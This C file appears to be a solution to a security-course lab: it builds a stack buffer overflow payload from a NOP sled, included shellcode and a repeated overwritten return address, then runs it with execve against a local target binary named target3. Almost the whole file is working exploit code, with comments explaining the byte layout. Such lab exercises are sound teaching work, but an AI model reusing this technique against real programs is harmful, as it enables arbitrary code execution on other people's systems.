#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char NOP[] = "\x90";

	char exploit[512];

	//buf is 64byte long

	//16 bytes
	strcpy(exploit, NOP);
	for(int i=0;i<15;i++){
		strcat(exploit, NOP);
	}

	//45bytes
	strcat(exploit, shellcode);

	//now, exploit is 16+45=61byte long
	//fill the rest 62-64 byte with NOP

	for(int i = 61; i < 64; i++){
		strcat(exploit, NOP);
	}

	//now fill the return address we want
	//address of buf is 0x3021fe50
	for(int i = 0; i < 2; i++){
		strcat(exploit, "\x50\xfe\x21\x30");  //due to little endian, have to fill backwards
	}




	args[0] = TARGET;
	//args[1] = "hi there";
	args[1] = exploit;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
